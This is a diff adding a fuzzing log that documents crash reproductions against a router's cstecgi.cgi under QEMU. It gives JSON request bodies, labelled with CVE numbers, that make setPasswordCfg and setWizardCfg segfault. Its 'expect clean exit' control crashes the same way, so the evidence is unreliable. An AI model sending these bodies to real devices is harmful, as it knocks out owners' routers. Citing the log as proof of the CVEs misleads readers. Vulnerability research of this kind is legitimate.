@@ -1,0 +1,32 @@
+RRFuzz vulnerability reproduction evidence
+Captured: 2026-09-14 20:23:06 on webfuzz
+----
+Script started on 2026-09-14 20:23:06+08:00 [<not executed on terminal>]
+=== CVE-2026-75012: setPasswordCfg without "password" field ===
+$ body: {"topicurl":"setPasswordCfg"}
+/home/webfuzz/Documents/qemu-rrfuzz/rrfuzz/tests/realworld/ex1200l_lighttpd/sysroot/www/cgi-bin/cstecgi.cgi: cache '/etc/ld.so.cache' is corrupt
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+timeout: the monitored command dumped core
+ex1200l_cves2.sh: line 8: 850095 Done                    REQUEST_METHOD=POST CONTENT_TYPE=application/json CONTENT_LENGTH=${#body} SCRIPT_NAME=/cgi-bin/cstecgi.cgi DOCUMENT_ROOT=/www SERVER_NAME=192.168.0.1 SERVER_PORT=80 QUERY_STRING="" REMOTE_ADDR=192.168.0.100 printf '%s' "$body"
+     850096 Segmentation fault      | timeout 15 $QEMU -L "$SYS" "$CGI"
+[exit=139]
+
+=== CVE-2026-75013: setWizardCfg without wizard fields ===
+$ body: {"topicurl":"setWizardCfg"}
+/home/webfuzz/Documents/qemu-rrfuzz/rrfuzz/tests/realworld/ex1200l_lighttpd/sysroot/www/cgi-bin/cstecgi.cgi: cache '/etc/ld.so.cache' is corrupt
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+timeout: the monitored command dumped core
+ex1200l_cves2.sh: line 8: 850100 Done                    REQUEST_METHOD=POST CONTENT_TYPE=application/json CONTENT_LENGTH=${#body} SCRIPT_NAME=/cgi-bin/cstecgi.cgi DOCUMENT_ROOT=/www SERVER_NAME=192.168.0.1 SERVER_PORT=80 QUERY_STRING="" REMOTE_ADDR=192.168.0.100 printf '%s' "$body"
+     850101 Segmentation fault      | timeout 15 $QEMU -L "$SYS" "$CGI"
+[exit=139]
+
+=== control: valid setPasswordCfg with password field (expect clean exit) ===
+$ body: {"topicurl":"setPasswordCfg","password":"AAAaaa111"}
+/home/webfuzz/Documents/qemu-rrfuzz/rrfuzz/tests/realworld/ex1200l_lighttpd/sysroot/www/cgi-bin/cstecgi.cgi: cache '/etc/ld.so.cache' is corrupt
+qemu: uncaught target signal 11 (Segmentation fault) - core dumped
+timeout: the monitored command dumped core
+ex1200l_cves2.sh: line 8: 850106 Done                    REQUEST_METHOD=POST CONTENT_TYPE=application/json CONTENT_LENGTH=${#body} SCRIPT_NAME=/cgi-bin/cstecgi.cgi DOCUMENT_ROOT=/www SERVER_NAME=192.168.0.1 SERVER_PORT=80 QUERY_STRING="" REMOTE_ADDR=192.168.0.100 printf '%s' "$body"
+     850107 Segmentation fault      | timeout 15 $QEMU -L "$SYS" "$CGI"
+[exit=139]
+
+Script done on 2026-09-14 20:23:07+08:00 [COMMAND_EXIT_CODE="0"]
